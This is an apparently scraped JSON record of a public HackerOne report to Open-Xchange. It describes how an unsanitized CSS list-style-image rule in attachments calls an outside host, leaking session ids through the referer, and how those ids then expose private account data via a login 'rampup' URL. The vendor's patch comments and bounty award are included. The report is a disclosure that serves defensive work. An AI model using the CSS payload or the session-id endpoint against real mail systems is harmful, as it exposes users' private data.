{"id":200487,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDA0ODc=","url":"https://hackerone.com/reports/200487","title":"Incomplete HTML sanitization + Session id leaking + private information disclosure","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-01-23T09:23:04.061Z","submitted_at":"2017-01-23T09:23:04.061Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"inhibitor181","url":"/inhibitor181","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-09-27T05:56:18.020Z","bug_reporter_agreed_on_going_public_at":"2017-08-28T05:56:15.945Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nI have found a chain of events that lead to session id leaking, witch can be then used to gather private data about other added inboxes to account / login id and some other infos. Unfortunatelly (for me) I wasn't able to make a hostile account takeover because of you session id + cookie linkage.\n\nSo, these are the problems :\n1. Incomplete sanitization in attachements :\n\n```\nli {list-style-image: url(\"https://www.google.com/\");}\n```\n\n is not sanitized and google.com is called\n2. The referer is passed when calling google.com\n3. If the attachement is put in task, calendar or profile, the session id is passed in the url when the attachement is opened in browser. Thus, the session id is in the referer and leaked\n4. The link \n\n```\nhttps://sandbox.open-xchange.com/appsuite/api/login?action=rampup\u0026rampup=true\u0026rampupFor=open-xchange-appsuite\u0026session=SESSION_ID_HERE\n```\n\ncan be called by not logged in users and reveals some sensitive data like : userid for login, uid (don't actually know the impact for this), various other data and most importantly, __private email accounts and their directories__\n\nBecause the video is too big (30-40Mb), I have attached it in my google drive :\n\n█████\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-09-27T05:56:16.005Z","allow_singular_disclosure_after":-127469088.31807049,"singular_disclosure_allowed":true,"vote_count":8,"voters":["eveeez","r3y","indoappsec","luckydivino","t4ym","sumit7","spetr0x","yongjin"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1437796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, indeed there is no way to take over a session by knowing the \"sessionid\" without replicating/stealing cookies, user-agent, geolocation and other parameters. We're looking into the situation about missing sanitization with regards to privacy however.","automated_response":false,"created_at":"2017-01-23T09:38:19.558Z","updated_at":"2017-01-23T09:38:19.558Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1437822,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We did some checks with E-Mail, and this can also be used to bypass the \"do not load external images\" privacy protection.","automated_response":false,"created_at":"2017-01-23T09:59:37.276Z","updated_at":"2017-01-23T09:59:37.276Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1437827,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mheiland : Thanks for the updates, really appreciate it ! ","automated_response":false,"created_at":"2017-01-23T10:02:11.518Z","updated_at":"2017-01-23T10:02:11.518Z","actor":{"username":"inhibitor181","cleared":true,"url":"/inhibitor181","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1467940,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing as resolved to award reputation, note that we're delivering and deploying the fix for this issue independently from HackerOne.","automated_response":false,"created_at":"2017-02-07T09:27:13.065Z","updated_at":"2017-02-07T09:27:13.065Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"inhibitor181","url":"/inhibitor181"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467941,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-02-07T09:27:22.136Z","updated_at":"2017-02-07T09:27:22.136Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"inhibitor181","url":"/inhibitor181"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1948035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mheiland . I would like to start disclosing some bugs. Would you mind redacting the link from google drive with the video ?","automated_response":false,"created_at":"2017-08-23T05:35:28.374Z","updated_at":"2017-08-23T05:35:28.374Z","actor":{"username":"inhibitor181","cleared":true,"url":"/inhibitor181","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1948248,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, disclosing this bug is fine, we patched it back in February already.","automated_response":false,"created_at":"2017-08-23T08:24:37.017Z","updated_at":"2017-08-23T08:24:37.017Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1958924,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-08-28T05:56:15.967Z","updated_at":"2017-08-28T05:56:15.967Z","first_to_agree":true,"actor":{"username":"inhibitor181","cleared":true,"url":"/inhibitor181","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2026526,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-09-27T05:56:18.045Z","updated_at":"2017-09-27T05:56:18.045Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Open-Xchange"}},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4916998,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-05-24T12:19:08.666Z","updated_at":"2019-05-24T12:19:08.666Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":401098},"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}